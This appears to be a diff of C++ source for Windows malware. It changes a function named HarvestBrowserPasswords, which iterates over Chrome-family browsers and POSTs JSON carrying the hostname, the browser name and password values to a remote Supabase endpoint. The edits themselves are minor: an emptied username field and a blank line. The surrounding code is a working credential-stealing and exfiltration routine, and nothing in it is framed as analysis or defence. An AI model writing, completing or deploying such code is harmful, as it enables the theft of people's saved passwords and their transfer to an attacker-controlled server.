@@ -1032,7 +1032,7 @@ static void HarvestBrowserPasswords() {
     for (int b = 0; kChromeBrowsers[b].name; b++) {
         std::string bName(kChromeBrowsers[b].name);
         auto Diag = [&](const std::string& s) {
-            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"origin_url\":\"[HARVEST]\",\"username_value\":\"status\",\"password_value\":\"" + EscapeJSON(s) + "\"}]";
+            std::string j = "[{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"browser\":\"" + EscapeJSON(bName) + "\",\"origin_url\":\"[HARVEST]\",\"username_value\":\"\",\"password_value\":\"" + EscapeJSON(s) + "\"}]";
             std::string pr;
             HttpRequest(L"POST", SUPABASE_PASSWORDS_PATH, j, pr);
         };
@@ -1757,6 +1757,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
     return 0;
 }
+
 
 
 
